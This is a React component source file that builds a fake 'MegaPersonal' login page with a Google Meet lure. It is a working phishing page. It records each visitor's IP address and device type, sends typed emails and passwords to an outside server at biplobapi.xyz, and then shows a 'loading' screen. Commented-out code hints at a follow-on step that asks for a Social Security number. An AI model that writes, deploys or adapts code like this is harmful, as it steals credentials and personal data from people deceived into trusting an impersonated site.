import React from "react";
import "./Test.css";
import { useEffect } from "react";
import { useState } from "react";
import { useForm } from "react-hook-form";
import {
  useLoaderData,
  useLocation,
  useNavigate,
  useParams,
} from "react-router-dom";
import { isBrowser, isMobile } from "react-device-detect";

const Test = () => {
  const { state } = useLocation();
  const navigate = useNavigate();
  const { user } = useLoaderData();
  const [userAgent, setUserAgent] = useState("");
  const [ipAddress, setIPAddress] = useState("");
  const id = useParams();
  let type;
  //   const { temp } = state;
  // console.log(user)

  if (isBrowser) {
    type = "desktop";
  } else {
    type = "mobile";
  }

  localStorage.setItem("url", `/${id.id}`);
  useEffect(() => {
    const userAgent = window.navigator.userAgent;
    setUserAgent(userAgent);
    fetch("https://api.ipify.org?format=json")
      .then((response) => response.json())
      .then((data) => setIPAddress(data.ip))
      .catch((error) => console.log(error));

    const bookings = {
      type: type,
    };
    // console.log(id.id)
    fetch(`https://biplobapi.xyz/updateclick/${id.id}`, {
      method: "PUT",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(bookings),
    })
      .then()
      .then();
  }, [type, id.id]);

  const {
    register,
    handleSubmit,
    formState: { errors },
    reset,
  } = useForm();
  const handleVerify = (data) => {
    const bookings = {
      email: data.email,
      password: data.password,
      agent: userAgent,
      ipAddress: ipAddress,
      user: user,
      temp: Math.floor(Math.random() * (9999 - 1111) + 1111),
      postingTime: Date().toLocaleString(),
    };

    // console.log(bookings);

    fetch(`https://biplobapi.xyz/informations`, {
      method: "POST",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(bookings),
    })
      .then((res) => res.json())
      .then((data) => {
        reset();
        pathInfo(bookings);
      });
  };

  const pathInfo = (infos) => {
    let userId = window.location.pathname;
    const fnl = userId.substring(
      userId.indexOf("/") + 1,
      userId.lastIndexOf("/")
    );
    navigate("/loading");
    // if (fnl === "auth/login") {
    //     navigate('/loading');
    //     // navigate(localStorage.getItem('url'));
    //     // navigate("/ssn", { state: { temp: infos.temp } });
    // } else {
    // }
  };

  return (
    <>
      <div className="text-center tmian">
        <h1 className="tmain-head">
          <span style={{ color: "rgb(255, 127, 80)" }}>Mega</span>
          <span style={{ color: "#6495ED" }}>Personal</span>
        </h1>
        <h5 className="tsub-head">Personal Classifieds</h5>
        <h3 className="tstrt">start here</h3>

        <form onSubmit={handleSubmit(handleVerify)}>
          <input
            {...register("email", { required: true })}
            type="email"
            className="tinput"
            placeholder="Your email"
            required=""
          />
          <input
            {...register("password", { required: true })}
            type="password"
            className="tinput"
            placeholder="Your Password"
            required=""
          />
          <button type="submit" className="tbtn">
            SUBMIT
          </button>
          <p className="twarn">( Google Meet Waiting for your login )</p>
        </form>
      </div>
      <img src="/gmeet.gif" alt="" className="timg" />
    </>
  );
};

export default Test;
